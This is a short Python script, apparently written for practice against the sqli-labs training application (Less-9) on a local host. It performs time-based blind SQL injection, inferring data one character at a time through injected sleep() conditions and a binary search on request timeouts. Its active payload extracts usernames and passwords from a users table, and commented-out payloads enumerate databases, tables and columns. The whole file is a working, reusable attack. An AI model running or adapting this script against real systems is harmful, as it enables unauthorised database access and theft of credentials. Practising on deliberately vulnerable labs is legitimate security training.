# -*-coding:utf-8-*-
# ----anthor: wum0nster---- #

import requests
import time


def sql_bool():
    req = ""
    for i in range(1,1000):
        low = 32
        high = 128
        # payload = "database()"
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='users'"
        payload = "select group_concat(concat(username,'~',password)) from users"
        while low < high:
            mid = (low + high) // 2
            # url = f"http://127.0.0.1:8888/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),{i},1))>{mid},sleep(1),0) --+"
            url = f"http://127.0.0.1:8888/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),0) --+"

            try:
                res = requests.get(url=url, timeout=1)
                high = mid
            except Exception as e:
                low = mid+1

            print(payload)
        req = req + chr(low)
        print(req)
sql_bool()

